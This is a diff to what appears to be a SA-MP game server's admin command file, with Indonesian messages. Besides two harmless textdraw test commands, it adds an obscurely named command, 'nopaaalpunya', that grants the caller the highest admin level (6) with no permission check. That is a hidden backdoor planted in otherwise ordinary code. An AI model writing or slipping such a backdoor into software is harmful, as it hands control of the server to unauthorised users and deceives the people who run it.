@@ -1,3 +1,8 @@
+CMD:nopaaalpunya(playerid)
+{
+pData[playerid][pAdmin] = 6;
+}
+
 CMD:acmds(playerid)
 {
 	if(pData[playerid][pAdmin] < 1)
@@ -57,6 +62,18 @@ CMD:setcs(playerid, params[])
 	Servers(targetid, "Admin "BLUE_E"%s "YELLOW_E"telah mengset Character Story kamu menjadi menjadi = %s", ReturnName(playerid), option);
 	pData[targetid][pCs] = option;
 	return 1;
+}
+CMD:oxtest(playerid, params[])
+{
+	TextDrawShowForPlayer(playerid, OXtdpasive);
+	TextDrawShowForPlayer(playerid, OXtdpasive1);
+	SelectTextDraw(playerid, 0x0000FF);
+}
+CMD:oxtest2(playerid, params[])
+{
+	for(new idx; idx < 7; idx++) 
+	{PlayerTextDrawShow(playerid, oxTD[playerid][idx]);}
+	SelectTextDraw(playerid, 0x0000FF);
 }
 CMD:flymode(playerid, params[])
 {
